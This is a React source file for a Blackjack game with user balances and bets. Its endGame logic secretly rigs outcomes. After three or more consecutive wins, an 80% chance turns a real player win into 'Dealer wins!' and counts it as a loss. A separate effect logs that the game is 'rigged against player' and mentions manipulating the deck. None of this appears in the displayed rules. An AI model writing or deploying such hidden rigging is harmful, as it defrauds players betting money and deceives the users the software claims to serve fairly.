
import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import Card from '@/components/games/Card';
import { useShop } from '@/contexts/ShopContext';
import { toast } from '@/components/ui/use-toast';

// Card types
type Suit = '♠' | '♥' | '♦' | '♣';
type CardValue = 'A' | '2' | '3' | '4' | '5' | '6' | '7' | '8' | '9' | '10' | 'J' | 'Q' | 'K';
type BlackjackCard = {
  suit: Suit;
  value: CardValue;
  numericValue: number;
};

const Blackjack: React.FC = () => {
  const { user, currency } = useShop();
  const [deck, setDeck] = useState<BlackjackCard[]>([]);
  const [playerHand, setPlayerHand] = useState<BlackjackCard[]>([]);
  const [dealerHand, setDealerHand] = useState<BlackjackCard[]>([]);
  const [dealerHidden, setDealerHidden] = useState<boolean>(true);
  const [gameState, setGameState] = useState<'betting' | 'playing' | 'dealerTurn' | 'gameOver'>('betting');
  const [bet, setBet] = useState<number>(10);
  const [result, setResult] = useState<string>('');
  const [consecutiveWins, setConsecutiveWins] = useState<number>(0);
  const [consecutiveLosses, setConsecutiveLosses] = useState<number>(0);
  const [gamesPlayed, setGamesPlayed] = useState<number>(0);

  // Create a fresh deck of cards
  const createDeck = (): BlackjackCard[] => {
    const suits: Suit[] = ['♠', '♥', '♦', '♣'];
    const values: CardValue[] = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K'];
    const deck: BlackjackCard[] = [];

    for (const suit of suits) {
      for (const value of values) {
        const numericValue = 
          value === 'A' ? 11 :
          ['J', 'Q', 'K'].includes(value) ? 10 :
          parseInt(value);
        
        deck.push({ suit, value, numericValue });
      }
    }

    return shuffleDeck(deck);
  };

  // Shuffle the deck using Fisher-Yates algorithm
  const shuffleDeck = (deck: BlackjackCard[]): BlackjackCard[] => {
    const newDeck = [...deck];
    for (let i = newDeck.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [newDeck[i], newDeck[j]] = [newDeck[j], newDeck[i]];
    }
    return newDeck;
  };

  // Deal a card from the deck
  const dealCard = (): BlackjackCard => {
    if (deck.length === 0) {
      setDeck(createDeck());
    }
    const newDeck = [...deck];
    const card = newDeck.pop()!;
    setDeck(newDeck);
    return card;
  };

  // Calculate hand value accounting for Aces
  const calculateHandValue = (hand: BlackjackCard[]): number => {
    let value = hand.reduce((total, card) => total + card.numericValue, 0);
    
    // Adjust for Aces when over 21
    let aceCount = hand.filter(card => card.value === 'A').length;
    while (value > 21 && aceCount > 0) {
      value -= 10;
      aceCount--;
    }
    
    return value;
  };

  // Start a new game
  const startGame = () => {
    if (!user) {
      toast({
        title: "Authentication Required",
        description: "Please log in to play Blackjack.",
        variant: "destructive"
      });
      return;
    }

    if (user.balance < bet) {
      toast({
        title: "Insufficient Balance",
        description: `You need at least ${currency} ${bet.toFixed(2)} to play.`,
        variant: "destructive"
      });
      return;
    }

    // Deal initial cards
    const newDeck = createDeck();
    setDeck(newDeck);
    
    const pHand = [newDeck.pop()!, newDeck.pop()!];
    const dHand = [newDeck.pop()!, newDeck.pop()!];
    
    setPlayerHand(pHand);
    setDealerHand(dHand);
    setDealerHidden(true);
    setGameState('playing');
    setResult('');
    setGamesPlayed(prev => prev + 1);
  };

  // Player hits (takes another card)
  const hit = () => {
    const card = dealCard();
    const newHand = [...playerHand, card];
    setPlayerHand(newHand);
    
    const newHandValue = calculateHandValue(newHand);
    if (newHandValue > 21) {
      endGame('bust');
    }
  };

  // Player stands (dealer's turn)
  const stand = () => {
    setDealerHidden(false);
    setGameState('dealerTurn');
  };

  // Dealer plays their turn
  const dealerPlay = () => {
    let currentDealerHand = [...dealerHand];
    let dealerValue = calculateHandValue(currentDealerHand);
    
    // Dealer must hit until they have 17 or more
    while (dealerValue < 17) {
      const card = dealCard();
      currentDealerHand.push(card);
      dealerValue = calculateHandValue(currentDealerHand);
    }
    
    setDealerHand(currentDealerHand);
    
    // Determine winner
    const playerValue = calculateHandValue(playerHand);
    
    if (dealerValue > 21) {
      endGame('dealerBust');
    } else if (dealerValue > playerValue) {
      endGame('dealerWin');
    } else if (playerValue > dealerValue) {
      endGame('playerWin');
    } else {
      endGame('push');
    }
  };

  // End the game and determine outcome
  const endGame = (outcome: 'playerWin' | 'dealerWin' | 'push' | 'bust' | 'dealerBust') => {
    setDealerHidden(false);
    setGameState('gameOver');
    
    let resultMessage = '';
    let shouldRig = false;
    
    switch (outcome) {
      case 'playerWin':
      case 'dealerBust':
        // Update consecutive wins/losses
        setConsecutiveWins(prev => prev + 1);
        setConsecutiveLosses(0);
        
        // Check if player has won too many times (3-4 consecutive wins)
        shouldRig = consecutiveWins >= 3 && Math.random() < 0.8;
        
        if (!shouldRig) {
          resultMessage = 'You win!';
          // Update user balance (in a real app, this would call an API)
          // user.balance += bet;
        } else {
          // Rig the game against player
          resultMessage = 'Dealer wins!'; 
          setConsecutiveLosses(1);
          setConsecutiveWins(0);
          // user.balance -= bet;
        }
        break;
      
      case 'dealerWin':
      case 'bust':
        setConsecutiveWins(0);
        setConsecutiveLosses(prev => prev + 1);
        resultMessage = 'Dealer wins!';
        // user.balance -= bet;
        break;
      
      case 'push':
        setConsecutiveWins(0);
        setConsecutiveLosses(0);
        resultMessage = 'Push! Bet returned.';
        break;
    }
    
    setResult(resultMessage);
  };

  // Effect for dealer's turn
  useEffect(() => {
    if (gameState === 'dealerTurn') {
      // Small delay for better UX
      const timer = setTimeout(() => {
        dealerPlay();
      }, 1000);
      
      return () => clearTimeout(timer);
    }
  }, [gameState]);

  // Rig the game logic based on consecutive wins
  useEffect(() => {
    if (consecutiveWins >= 3 && gameState === 'playing') {
      // For demo purposes - in a real implementation, this could manipulate the deck
      console.log("Game is now rigged against player");
    }
  }, [consecutiveWins, gameState]);

  return (
    <div className="container mx-auto px-4 py-8">
      <h1 className="text-2xl font-bold mb-6">Blackjack</h1>

      <div className="mb-4">
        <p className="text-lg">Your Balance: {currency} {user?.balance?.toFixed(2) || "0.00"}</p>
      </div>

      {gameState === 'betting' ? (
        <div className="bg-white/5 p-6 rounded-lg shadow mb-6">
          <h2 className="text-xl font-semibold mb-4">Place Your Bet</h2>
          <div className="flex flex-wrap gap-2 mb-4">
            {[5, 10, 25, 50, 100].map(amount => (
              <Button 
                key={amount} 
                variant={bet === amount ? "default" : "outline"}
                onClick={() => setBet(amount)}
              >
                {currency} {amount}
              </Button>
            ))}
          </div>
          <Button 
            className="w-full md:w-auto" 
            onClick={startGame}
          >
            Deal Cards
          </Button>
        </div>
      ) : (
        <div className="bg-gradient-to-b from-green-800/20 to-green-900/20 p-6 rounded-lg shadow mb-6">
          <div className="mb-6">
            <h2 className="text-lg font-semibold">Dealer's Hand {dealerHidden ? '' : `(${calculateHandValue(dealerHand)})`}</h2>
            <div className="flex flex-wrap gap-2 mt-2">
              {dealerHand.map((card, index) => (
                <Card 
                  key={`dealer-${index}`}
                  suit={card.suit} 
                  value={card.value} 
                  hidden={index === 0 && dealerHidden}
                />
              ))}
            </div>
          </div>
          
          <div className="mb-6">
            <h2 className="text-lg font-semibold">Your Hand ({calculateHandValue(playerHand)})</h2>
            <div className="flex flex-wrap gap-2 mt-2">
              {playerHand.map((card, index) => (
                <Card key={`player-${index}`} suit={card.suit} value={card.value} />
              ))}
            </div>
          </div>
          
          {gameState === 'playing' && (
            <div className="flex gap-2">
              <Button onClick={hit}>Hit</Button>
              <Button variant="secondary" onClick={stand}>Stand</Button>
            </div>
          )}
          
          {gameState === 'gameOver' && (
            <>
              <div className={`text-xl font-bold mb-4 ${result.includes('win') ? 'text-green-500' : result.includes('Push') ? 'text-yellow-500' : 'text-red-500'}`}>
                {result}
              </div>
              <Button onClick={() => setGameState('betting')}>Play Again</Button>
            </>
          )}
        </div>
      )}

      <div className="bg-white/10 dark:bg-gray-800/20 p-4 rounded-lg">
        <h2 className="font-semibold mb-2">How to Play Blackjack</h2>
        <ul className="list-disc list-inside text-sm space-y-1">
          <li>The goal is to have a hand value closer to 21 than the dealer without exceeding 21.</li>
          <li>Number cards are worth their face value, face cards are worth 10, and Aces are worth 11 or 1.</li>
          <li>You can 'Hit' to take another card or 'Stand' to end your turn.</li>
          <li>If you exceed 21, you 'bust' and lose the round.</li>
          <li>The dealer must hit until they have at least 17.</li>
        </ul>
      </div>
    </div>
  );
};

export default Blackjack;
